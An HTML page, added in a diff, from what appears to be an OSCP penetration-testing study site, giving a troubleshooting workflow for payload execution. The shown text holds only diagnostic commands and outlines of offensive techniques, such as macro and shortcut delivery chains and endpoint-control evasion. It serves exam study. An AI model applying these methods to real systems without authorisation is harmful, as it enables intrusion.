@@ -1,0 +1,1320 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Resolve payload execution obstacles — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/notes/methods/execution/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/notes/methods/execution/#first-pass-tools-and-findings">First pass: tools and findings</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-first-failed-runtime-boundary">Find the first failed runtime boundary</a></li><li><a href="/oscp/notes/methods/execution/#match-the-payload-handler-and-connection-direction">Match the payload handler and connection direction</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#discovery-workflow">Discovery workflow</a></li><li><a href="/oscp/notes/methods/execution/#method-families">Method families</a></li><li><a href="/oscp/notes/methods/execution/#choose-a-method">Choose a method</a></li><li><a href="/oscp/notes/methods/execution/#use-a-gated-office-macro-delivery-chain">Use a gated Office macro delivery chain</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#use-a-windows-librarywebdavshortcut-chain-with-explicit-interaction">Use a Windows Library/WebDAV/shortcut chain with explicit interaction</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-1">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-1">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-1">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-1">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-1">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-1">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-1">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-1">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-1">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-1">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#match-an-artifact-to-its-executable-consumer-and-runtime">Match an artifact to its executable consumer and runtime</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-2">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-2">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-2">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-2">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-2">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-2">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/execution/#41-linux-checks">4.1 Linux checks</a></li><li><a href="/oscp/notes/methods/execution/#42-windows-checks">4.2 Windows checks</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-2">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-2">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-2">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-2">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#repair-quoting-encoding-and-command-length-boundaries">Repair quoting, encoding and command-length boundaries</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-3">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-3">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-3">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-3">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-3">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-3">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-3">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-3">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-3">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-3">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#distinguish-powershell-policy-language-mode-and-protected-execution-layers">Distinguish PowerShell policy, language mode and protected execution layers</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-4">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-4">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-4">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-4">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-4">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-4">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-4">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-4">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-4">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-4">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#interpret-endpoint-control-evidence-and-select-a-justified-alternative">Interpret endpoint-control evidence and select a justified alternative</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-5">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-5">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-5">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-5">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-5">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-5">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-5">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-5">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-5">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-5">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#pair-staged-payloads-with-the-correct-handler-and-session-lifecycle">Pair staged payloads with the correct handler and session lifecycle</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-6">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-6">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-6">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-6">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-6">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-6">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-6">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-6">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-6">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-6">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#use-a-framework-module-with-explicit-target-and-feature-constraints">Use a framework module with explicit target and feature constraints</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-7">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-7">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-7">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-7">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-7">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-7">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-7">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-7">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-7">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-7">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#diagnose-connection-direction-listener-and-session-failures-in-order">Diagnose connection direction, listener and session failures in order</a><ul><li><a href="/oscp/notes/methods/execution/#1-purpose-and-result-8">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/execution/#2-recognition-clues-8">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/execution/#find-the-clue-from-your-starting-access-8">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#3-prerequisites-8">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/execution/#5-why-it-works-8">5. Why it works</a></li><li><a href="/oscp/notes/methods/execution/#6-execute-and-choose-variants-8">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/execution/#a-document-delivered-no-callback">A. Document delivered, no callback</a></li><li><a href="/oscp/notes/methods/execution/#b-executable-disappears-after-transfer">B. Executable disappears after transfer</a></li><li><a href="/oscp/notes/methods/execution/#c-powershell-says-scripts-are-disabled">C. PowerShell says scripts are disabled</a></li><li><a href="/oscp/notes/methods/execution/#d-connection-reaches-netcat-but-there-is-no-shell">D. Connection reaches Netcat but there is no shell</a></li><li><a href="/oscp/notes/methods/execution/#e-binary-exists-but-returns-not-found-on-linux">E. Binary exists but returns “not found” on Linux</a></li><li><a href="/oscp/notes/methods/execution/#f-metasploit-module-reports-completion-no-session">F. Metasploit module reports completion, no session</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#7-worked-example--hypothetical-8">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/execution/#8-verify-the-result-8">8. Verify the result</a></li><li><a href="/oscp/notes/methods/execution/#9-failure-and-fallback-8">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/execution/#10-next-transitions-8">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/execution/#sources-and-shared-concepts">Sources and shared concepts</a></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details open><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details open><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/" aria-current="page">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="resolve-payload-execution-obstacles">Resolve payload execution obstacles</h1>
+<p><a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | <a href="/oscp/notes/Master_Notes/">Master Notes</a> | <a href="/oscp/">Operational index</a> | <a href="/oscp/cheatsheets/">Cheatsheets</a></p>
+<p>Locate the first failed boundary: delivery → trigger → parser → format/runtime → execution policy/control → connection → session. Change the condition supported by evidence instead of replacing every payload component.</p>
+<p><strong>Speedrun blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <strong>Documented methods:</strong> 9.</p>
+<p>Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.</p>
+<h2 id="first-pass-tools-and-findings">First pass: tools and findings</h2>
+<p>Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.</p>
+<h3 id="find-the-first-failed-runtime-boundary">Find the first failed runtime boundary</h3>
+<p>Check bytes, file type, architecture and runtime before trying another payload.</p>
+<pre><code class="language-bash">file FILE
+sha256sum FILE
+readelf -l FILE 2>/dev/null
+uname -m
+</code></pre>
+<ul>
+<li><strong>If Wrong architecture or executable format:</strong> Fix the artifact/build before re-running it. → <a href="/oscp/notes/methods/public-exploits/#exploit-compile">Compile and minimally adapt an existing native or memory-corruption PoC</a>.</li>
+<li><strong>If The file reaches a different parser than expected:</strong> Inspect quoting, encoding and the exact invocation. → <a href="/oscp/notes/methods/execution/#execution-parser">Repair quoting, encoding and command-length boundaries</a>.</li>
+<li><strong>Otherwise:</strong> The artifact runs but no session appears: inspect handler and packet direction. → <a href="/oscp/notes/methods/execution/#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a>.</li>
+</ul>
+<h3 id="match-the-payload-handler-and-connection-direction">Match the payload handler and connection direction</h3>
+<p>Keep the exact payload/session type, listener address and actual initiator together.</p>
+<pre><code class="language-text">show options
+jobs
+sessions
+</code></pre>
+<ul>
+<li><strong>If Handler settings match but no packet arrives:</strong> Check the callback route from the target, including any pivot. → <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</li>
+<li><strong>If A session opens under the expected identity:</strong> Verify the host and make the command channel usable. → <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</li>
+<li><strong>Otherwise:</strong> A connection immediately dies: inspect the actual process/session lifecycle rather than assuming a working shell. → <a href="/oscp/notes/methods/execution/#execution-framework">Use a framework module with explicit target and feature constraints</a>.</li>
+</ul>
+<h2 id="discovery-workflow">Discovery workflow</h2>
+<p>Start with the saved delivery/trigger/parser/runtime/connection chain and the last state actually proved.</p>
+<p>Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.</p>
+<ol>
+<li>For client-side paths establish the consumer and required interaction before callbacks: <a href="/oscp/notes/methods/execution/#execution-office">Use a gated Office macro delivery chain</a>; <a href="/oscp/notes/methods/execution/#execution-library">Use a Windows Library/WebDAV/shortcut chain with explicit interaction</a>.</li>
+<li>Inspect bytes, format, architecture, parser and runtime at the first failed boundary: <a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/execution/#execution-parser">Repair quoting, encoding and command-length boundaries</a>.</li>
+<li>Differentiate PowerShell language/policy and endpoint-control evidence: <a href="/oscp/notes/methods/execution/#execution-powershell">Distinguish PowerShell policy, language mode and protected execution layers</a>; <a href="/oscp/notes/methods/execution/#execution-controls">Interpret endpoint-control evidence and select a justified alternative</a>.</li>
